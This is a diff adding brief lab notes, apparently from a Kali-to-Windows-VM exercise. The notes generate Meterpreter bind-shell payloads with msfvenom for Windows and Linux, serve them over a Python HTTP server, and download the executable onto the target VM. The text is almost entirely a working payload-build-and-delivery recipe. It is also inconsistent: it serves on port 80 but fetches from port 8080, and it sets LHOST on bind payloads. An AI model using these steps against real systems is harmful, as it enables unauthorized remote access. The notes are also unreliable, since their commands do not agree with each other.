@@ -1,0 +1,7 @@
+1. msfvenom -p windows/meterpreter/bind_tcp LHOST=192.168.1.22 LPORT=4444 -f exe>pay.exe -> It makes a payload for windows with meterpreter bind shell and saves it as pay.exe
+
+2. msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=192.168.1.22 LPORT=4444 -f elf>pay.elf -> It makes a payload for Linux with meterpreter bind shell and saves it as pay.elf
+
+3. python3 -m http.server 80 -> It starts a simple HTTP server on port 80 to serve the payloads created above.
+
+4. open windows vm -> chrome -> http://<kali-ip>:8080/pay.exe -> It downloads the pay.exe payload from the Kali machine to the Windows VM.
